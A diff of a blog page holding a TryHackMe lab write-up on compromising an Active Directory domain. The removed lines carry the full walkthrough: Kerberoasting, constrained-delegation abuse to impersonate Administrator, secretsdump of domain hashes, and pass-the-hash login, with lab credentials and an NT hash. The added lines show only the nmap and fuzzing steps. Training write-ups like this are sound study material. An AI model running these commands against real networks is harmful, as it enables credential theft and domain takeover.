@@ -1,88 +1,373 @@
-<!doctype html><html lang=en dir=auto data-theme=dark><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Crocc Crew — TryHackMe Detailed Writeup | n0rmh3ll</title><meta name=keywords content="tryhackme,active-directory,kerberos,privilege-escalation,red-team"><meta name=description content="Full detailed walkthrough of the Crocc Crew room on TryHackMe"><meta name=author content><link rel=canonical href=https://n0rmh3ll.github.io/posts/crocc_crew/><link crossorigin=anonymous href=/assets/css/stylesheet.e15e450df41797ce262257fe66ba99943b30f3528a03bc50aef42bcce1ab3585.css integrity="sha256-4V5FDfQXl84mIlf+ZrqZlDsw81KKA7xQrvQrzOGrNYU=" rel="preload stylesheet" as=style><link rel=icon href=https://n0rmh3ll.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://n0rmh3ll.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://n0rmh3ll.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://n0rmh3ll.github.io/apple-touch-icon.png><link rel=mask-icon href=https://n0rmh3ll.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://n0rmh3ll.github.io/posts/crocc_crew/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://n0rmh3ll.github.io/posts/crocc_crew/"><meta property="og:site_name" content="n0rmh3ll"><meta property="og:title" content="Crocc Crew — TryHackMe Detailed Writeup"><meta property="og:description" content="Full detailed walkthrough of the Crocc Crew room on TryHackMe"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-11-06T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-06T00:00:00+00:00"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Active-Directory"><meta property="article:tag" content="Kerberos"><meta property="article:tag" content="Privilege-Escalation"><meta property="article:tag" content="Red-Team"><meta name=twitter:card content="summary"><meta name=twitter:title content="Crocc Crew — TryHackMe Detailed Writeup"><meta name=twitter:description content="Full detailed walkthrough of the Crocc Crew room on TryHackMe"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://n0rmh3ll.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Crocc Crew — TryHackMe Detailed Writeup","item":"https://n0rmh3ll.github.io/posts/crocc_crew/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Crocc Crew — TryHackMe Detailed Writeup","name":"Crocc Crew — TryHackMe Detailed Writeup","description":"Full detailed walkthrough of the Crocc Crew room on TryHackMe","keywords":["tryhackme","active-directory","kerberos","privilege-escalation","red-team"],"articleBody":" Room Link https://tryhackme.com/room/crocccrew Difficulty Insane Points 120 Summary This room is a full Active Directory attack simulation focused on realistic enterprise privilege escalation. We start with minimal external access, enumerate exposed services, and identify weak entry points into the network. After obtaining low-privileged AD credentials, we move into internal enumeration, discover misconfigurations in Kerberos Constrained Delegation, and exploit it to impersonate privileged users. From there, we extract NT hashes and Kerberos keys, gain full Domain Administrator access, and ultimately compromise the entire domain.\nThis writeup walks through each stage of the attack: Service \u0026 Domain Enumeration Identifying and using exposed credentials SMB \u0026 LDAP enumeration Kerberoasting to obtain service account credentials Abuse of Constrained Delegation (S4U2Self \u0026 S4U2Proxy) Extracting secrets via secretsdump Achieving full Domain Admin access If you’re studying Kerberos internals, realistic AD compromise paths, or red team post-exploitation, this room is an excellent hands-on challenge\nInitial scan Nmap Command:\nnmap -sC -sV -sS 10.10.236.0 Output:\n┌──(kali㉿kali)-[~] └─$ sudo nmap -sC -sV -sS 10.10.236.0 [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 14:46 IST Stats: 0:03:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 85.71% done; ETC: 14:49 (0:00:02 remaining) Nmap scan report for 10.10.236.0 Host is up (0.24s latency). Not shown: 986 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-04 09:19:45Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2025-06-04T09:22:02+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC.COOCTUS.CORP | Not valid before: 2025-06-03T08:40:24 |_Not valid after: 2025-12-03T08:40:24 | rdp-ntlm-info: | Target_Name: COOCTUS | NetBIOS_Domain_Name: COOCTUS | NetBIOS_Computer_Name: DC | DNS_Domain_Name: COOCTUS.CORP | DNS_Computer_Name: DC.COOCTUS.CORP | Product_Version: 10.0.17763 |_ System_Time: 2025-06-04T09:19:57+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results:\n| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-04T09:19:58 |_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 331.93 seconds We can see there is a website running on port 80. Let’s try fuzzing it.\nWeb fuzzing Command:\nffuf -u http://10.10.96.32/FUZZ -w /usr/share/wordlists/dirb/common.txt Output (trimmed):\nindex.html [Status: 200, Size: 5342323] robots.txt [Status: 200, Size: 70] robots.txt User-Agent: * Disallow: /robots.txt /db-config.bak /backdoor.php Found: /db-config.bak — contains server credentials:\n$servername = \"db.cooctus.corp\"; $username = \"C00ctusAdm1n\"; $password = \"B4dt0th3b0n3\"; Tried rpcclient — nothing interesting returned, then attempted RDP.\nRDP and found credentials RDP connect attempt:\nrdesktop -f -u \"\" 10.10.23.38 RDP warned about an invalid certificate (self-signed). Connected and found credentials in the lockscreen wallpaper:\nVisitor GuestLogin! Use these credentials for credential spray / access.\nSMB access with credentials CrackMapExec:\ncrackmapexec smb 10.10.23.38 -u Visitor -p GuestLogin! --users Output shows COOCTUS.CORP\\Visitor:GuestLogin! is valid.\nEnumerating shares:\nsmbclient -L //10.10.23.38 -U \"Visitor\" Accessible shares: ADMIN$, C$, Home, IPC$, NETLOGON, SYSVOL.\nAccess Home share:\nsmbclient //10.10.175.192/Home -U \"Visitor\" Found user.txt:\nTHM{Gu3st_******} LDAP / AD enumeration Used enum4linux-ng and ldapdomaindump to dump AD details.\nldapdomaindump 10.10.175.192 -u \"COOCTUS\\Visitor\" -p 'GuestLogin!' Found password-reset account configured with TRUSTED_TO_AUTH_FOR_DELEGATION! — supports constrained delegation theory.\nKerberos — GetUserSPNs \u0026 Crack TGS GetUserSPNs:\nimpacket-GetUserSPNs COOCTUS.CORP/Visitor:GuestLogin! -request -dc-ip 10.10.96.32 -outputfile TGS.txt Returned SPN: HTTP/dc.cooctus.corp password-reset (constrained).\nCracked TGS with John:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash_crocc Result: resetpassword cracked.\nDelegation discovery and abuse Find delegation:\nimpacket-findDelegation -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip 10.10.96.32 Delegation rights to: oakley/DC.COOCTUS.CORP.\nGet ST (impersonate Administrator):\nimpacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator \"COOCTUS.CORP/password-reset:resetpassword\" -dc-ip 10.10.96.32 Saved ticket: Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache.\nSet the ticket for local usage:\nexport KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache Added host entry for DC.COOCTUS.CORP to /etc/hosts:\n10.10.175.192 DC.COOCTUS.CORP Retrieving secrets (secretsdump) Used impacket secretsdump with Kerberos ticket:\nimpacket-secretsdump -k -no-pass DC.COOCTUS.CORP Key results (trimmed):\nAdministrator:500:...:add41095f1fb0405b32f70a489de022d::: ... (many domain accounts and Kerberos keys) Administrator NT hash: add41095f1fb0405b32f70a489de022d.\nAdministrator access with Evil-WinRM evil-winrm -i 10.10.96.32 -u Administrator -H 'add41095f1fb0405b32f70a489de022d' Got Administrator shell.\nFlags User flag (from Home share):\nTHM{Gu3st_******} Privilege escalation flags (found on system):\nTHM{0n-************-DA} THM{Wh4t-t0-d0*******************} Root flag:\nFound in C:\\PerfLogs\\Admin\\root.txt:\nTHM{Cr0cc*****************} Conclusion We enumerated the host, found web and RDP entry points, discovered credentials via an exposed backup file and RDP wallpaper, authenticated to SMB, enumerated AD, abused constrained delegation to impersonate Administrator, retrieved NT hashes and Kerberos keys with secretsdump, and obtained Administrator access to read flags.\nThe END.\n","wordCount":"786","inLanguage":"en","datePublished":"2025-11-06T00:00:00Z","dateModified":"2025-11-06T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://n0rmh3ll.github.io/posts/crocc_crew/"},"publisher":{"@type":"Organization","name":"n0rmh3ll","logo":{"@type":"ImageObject","url":"https://n0rmh3ll.github.io/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://n0rmh3ll.github.io/ accesskey=h title="n0rmh3ll (Alt + H)">n0rmh3ll</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://n0rmh3ll.github.io/ title=Home><span>Home</span></a></li><li><a href=https://n0rmh3ll.github.io/posts/ title=Blog><span>Blog</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Crocc Crew — TryHackMe Detailed Writeup</h1><div class=post-description>Full detailed walkthrough of the Crocc Crew room on TryHackMe</div><div class=post-meta><span title='2025-11-06 00:00:00 +0000 UTC'>November 6, 2025</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#summary aria-label=Summary>Summary</a></li><li><a href=#initial-scan aria-label="Initial scan">Initial scan</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#web-fuzzing aria-label="Web fuzzing">Web fuzzing</a><ul><li><a href=#robotstxt aria-label=robots.txt>robots.txt</a></li></ul></li><li><a href=#rdp-and-found-credentials aria-label="RDP and found credentials">RDP and found credentials</a></li><li><a href=#smb-access-with-credentials aria-label="SMB access with credentials">SMB access with credentials</a></li><li><a href=#ldap--ad-enumeration aria-label="LDAP / AD enumeration">LDAP / AD enumeration</a></li><li><a href=#kerberos--getuserspns--crack-tgs aria-label="Kerberos — GetUserSPNs & Crack TGS">Kerberos — GetUserSPNs & Crack TGS</a></li><li><a href=#delegation-discovery-and-abuse aria-label="Delegation discovery and abuse">Delegation discovery and abuse</a></li><li><a href=#retrieving-secrets-secretsdump aria-label="Retrieving secrets (secretsdump)">Retrieving secrets (secretsdump)</a></li><li><a href=#administrator-access-with-evil-winrm aria-label="Administrator access with Evil-WinRM">Administrator access with Evil-WinRM</a></li><li><a href=#flags aria-label=Flags>Flags</a></li><li><a href=#conclusion aria-label=Conclusion>Conclusion</a></li></ul></div></details></div><div class=post-content><table><thead><tr><th><strong>Room Link</strong></th><th><a href=https://tryhackme.com/room/crocccrew>https://tryhackme.com/room/crocccrew</a></th></tr></thead><tbody><tr><td><strong>Difficulty</strong></td><td>Insane</td></tr><tr><td><strong>Points</strong></td><td>120</td></tr></tbody></table><h2 id=summary>Summary<a hidden class=anchor aria-hidden=true href=#summary>#</a></h2><p>This room is a full Active Directory attack simulation focused on realistic enterprise privilege escalation. We start with minimal external access, enumerate exposed services, and identify weak entry points into the network. After obtaining low-privileged AD credentials, we move into internal enumeration, discover misconfigurations in Kerberos Constrained Delegation, and exploit it to impersonate privileged users. From there, we extract NT hashes and Kerberos keys, gain full Domain Administrator access, and ultimately compromise the entire domain.</p><ul><li>This writeup walks through each stage of the attack:</li><li>Service & Domain Enumeration</li><li>Identifying and using exposed credentials</li><li>SMB & LDAP enumeration</li><li>Kerberoasting to obtain service account credentials</li><li>Abuse of Constrained Delegation (S4U2Self & S4U2Proxy)</li><li>Extracting secrets via secretsdump</li><li>Achieving full Domain Admin access</li></ul><p>If you&rsquo;re studying Kerberos internals, realistic AD compromise paths, or red team post-exploitation, this room is an excellent hands-on challenge</p><h2 id=initial-scan>Initial scan<a hidden class=anchor aria-hidden=true href=#initial-scan>#</a></h2><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sC -sV -sS 10.10.236.0
-</span></span></code></pre></div><p><strong>Output:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>┌──(kali㉿kali)-[~]
-</span></span><span style=display:flex><span>└─$ sudo nmap -sC -sV -sS 10.10.236.0            
-</span></span><span style=display:flex><span>[sudo] password for kali:
-</span></span><span style=display:flex><span>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 14:46 IST
-</span></span><span style=display:flex><span>Stats: 0:03:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-</span></span><span style=display:flex><span>Service scan Timing: About 85.71% done; ETC: 14:49 (0:00:02 remaining)
-</span></span><span style=display:flex><span>Nmap scan report for 10.10.236.0
-</span></span><span style=display:flex><span>Host is up (0.24s latency).
-</span></span><span style=display:flex><span>Not shown: 986 closed tcp ports (reset)
-</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
-</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
-</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
-</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
-</span></span><span style=display:flex><span>| http-methods:
-</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
-</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 09:19:45Z)
-</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
-</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
-</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
-</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
-</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
-</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
-</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
-</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
-</span></span><span style=display:flex><span>|_ssl-date: 2025-06-04T09:22:02+00:00; 0s from scanner time.
-</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
-</span></span><span style=display:flex><span>| Not valid before: 2025-06-03T08:40:24
-</span></span><span style=display:flex><span>|_Not valid after:  2025-12-03T08:40:24
-</span></span><span style=display:flex><span>| rdp-ntlm-info:
-</span></span><span style=display:flex><span>|   Target_Name: COOCTUS
-</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: COOCTUS
-</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: DC
-</span></span><span style=display:flex><span>|   DNS_Domain_Name: COOCTUS.CORP
-</span></span><span style=display:flex><span>|   DNS_Computer_Name: DC.COOCTUS.CORP
-</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
-</span></span><span style=display:flex><span>|_  System_Time: 2025-06-04T09:19:57+00:00
-</span></span><span style=display:flex><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span style=display:flex><span>|_http-title: Not Found
-</span></span><span style=display:flex><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
-</span></span></code></pre></div><p>Host script results:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>| smb2-security-mode:
-</span></span><span style=display:flex><span>|   3:1:1:
-</span></span><span style=display:flex><span>|_    Message signing enabled and required
-</span></span><span style=display:flex><span>| smb2-time:
-</span></span><span style=display:flex><span>|   date: 2025-06-04T09:19:58
-</span></span><span style=display:flex><span>|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 331.93 seconds
-</span></span></code></pre></div><blockquote><p>We can see there is a website running on port 80. Let’s try fuzzing it.</p></blockquote><hr><h2 id=web-fuzzing>Web fuzzing<a hidden class=anchor aria-hidden=true href=#web-fuzzing>#</a></h2><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -u http://10.10.96.32/FUZZ -w /usr/share/wordlists/dirb/common.txt
-</span></span></code></pre></div><p><strong>Output (trimmed):</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>index.html              [Status: 200, Size: 5342323]
-</span></span><span style=display:flex><span>robots.txt              [Status: 200, Size: 70]
-</span></span></code></pre></div><h3 id=robotstxt>robots.txt<a hidden class=anchor aria-hidden=true href=#robotstxt>#</a></h3><pre tabindex=0><code>User-Agent: *
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Crocc Crew — TryHackMe Detailed Writeup | n0rmh3ll</title>
+<meta name="keywords" content="tryhackme, active-directory, kerberos, privilege-escalation, red-team">
+<meta name="description" content="Full detailed walkthrough of the Crocc Crew room on TryHackMe">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/crocc_crew/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.e15e450df41797ce262257fe66ba99943b30f3528a03bc50aef42bcce1ab3585.css" integrity="sha256-4V5FDfQXl84mIlf&#43;ZrqZlDsw81KKA7xQrvQrzOGrNYU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/crocc_crew/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="n0rmh3ll (Alt + H)">n0rmh3ll</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Crocc Crew — TryHackMe Detailed Writeup
+    </h1>
+    <div class="post-description">
+      Full detailed walkthrough of the Crocc Crew room on TryHackMe
+    </div>
+    <div class="post-meta"><span title='2025-11-06 00:00:00 +0000 UTC'>November 6, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#summary" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#initial-scan" aria-label="Initial scan">Initial scan</a><ul>
+                        
+                <li>
+                    <a href="#nmap" aria-label="Nmap">Nmap</a></li></ul>
+                </li>
+                <li>
+                    <a href="#web-fuzzing" aria-label="Web fuzzing">Web fuzzing</a><ul>
+                        
+                <li>
+                    <a href="#robotstxt" aria-label="robots.txt">robots.txt</a></li></ul>
+                </li>
+                <li>
+                    <a href="#rdp-and-found-credentials" aria-label="RDP and found credentials">RDP and found credentials</a></li>
+                <li>
+                    <a href="#smb-access-with-credentials" aria-label="SMB access with credentials">SMB access with credentials</a></li>
+                <li>
+                    <a href="#ldap--ad-enumeration" aria-label="LDAP / AD enumeration">LDAP / AD enumeration</a></li>
+                <li>
+                    <a href="#kerberos--getuserspns--crack-tgs" aria-label="Kerberos — GetUserSPNs &amp; Crack TGS">Kerberos — GetUserSPNs &amp; Crack TGS</a></li>
+                <li>
+                    <a href="#delegation-discovery-and-abuse" aria-label="Delegation discovery and abuse">Delegation discovery and abuse</a></li>
+                <li>
+                    <a href="#retrieving-secrets-secretsdump" aria-label="Retrieving secrets (secretsdump)">Retrieving secrets (secretsdump)</a></li>
+                <li>
+                    <a href="#administrator-access-with-evil-winrm" aria-label="Administrator access with Evil-WinRM">Administrator access with Evil-WinRM</a></li>
+                <li>
+                    <a href="#flags" aria-label="Flags">Flags</a></li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><table>
+  <thead>
+      <tr>
+          <th><strong>Room Link</strong></th>
+          <th><a href="https://tryhackme.com/room/crocccrew">https://tryhackme.com/room/crocccrew</a></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Difficulty</strong></td>
+          <td>Insane</td>
+      </tr>
+      <tr>
+          <td><strong>Points</strong></td>
+          <td>120</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<p>This room is a full Active Directory attack simulation focused on realistic enterprise privilege escalation. We start with minimal external access, enumerate exposed services, and identify weak entry points into the network. After obtaining low-privileged AD credentials, we move into internal enumeration, discover misconfigurations in Kerberos Constrained Delegation, and exploit it to impersonate privileged users. From there, we extract NT hashes and Kerberos keys, gain full Domain Administrator access, and ultimately compromise the entire domain.</p>
+<ul>
+<li>This writeup walks through each stage of the attack:</li>
+<li>Service &amp; Domain Enumeration</li>
+<li>Identifying and using exposed credentials</li>
+<li>SMB &amp; LDAP enumeration</li>
+<li>Kerberoasting to obtain service account credentials</li>
+<li>Abuse of Constrained Delegation (S4U2Self &amp; S4U2Proxy)</li>
+<li>Extracting secrets via secretsdump</li>
+<li>Achieving full Domain Admin access</li>
+</ul>
+<p>If you&rsquo;re studying Kerberos internals, realistic AD compromise paths, or red team post-exploitation, this room is an excellent hands-on challenge</p>
+<h2 id="initial-scan">Initial scan<a hidden class="anchor" aria-hidden="true" href="#initial-scan">#</a></h2>
+<h3 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
+<p><strong>Command:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -sS 10.10.236.0
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(kali㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sC -sV -sS 10.10.236.0            
+</span></span><span style="display:flex;"><span>[sudo] password for kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 14:46 IST
+</span></span><span style="display:flex;"><span>Stats: 0:03:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 85.71% done; ETC: 14:49 (0:00:02 remaining)
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.236.0
+</span></span><span style="display:flex;"><span>Host is up (0.24s latency).
+</span></span><span style="display:flex;"><span>Not shown: 986 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 09:19:45Z)
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>3269/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-06-04T09:22:02+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-06-03T08:40:24
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-12-03T08:40:24
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info:
+</span></span><span style="display:flex;"><span>|   Target_Name: COOCTUS
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: COOCTUS
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: DC
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: COOCTUS.CORP
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: DC.COOCTUS.CORP
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2025-06-04T09:19:57+00:00
+</span></span><span style="display:flex;"><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>Host script results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2025-06-04T09:19:58
+</span></span><span style="display:flex;"><span>|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 331.93 seconds
+</span></span></code></pre></div><blockquote>
+<p>We can see there is a website running on port 80. Let’s try fuzzing it.</p>
+</blockquote>
+<hr>
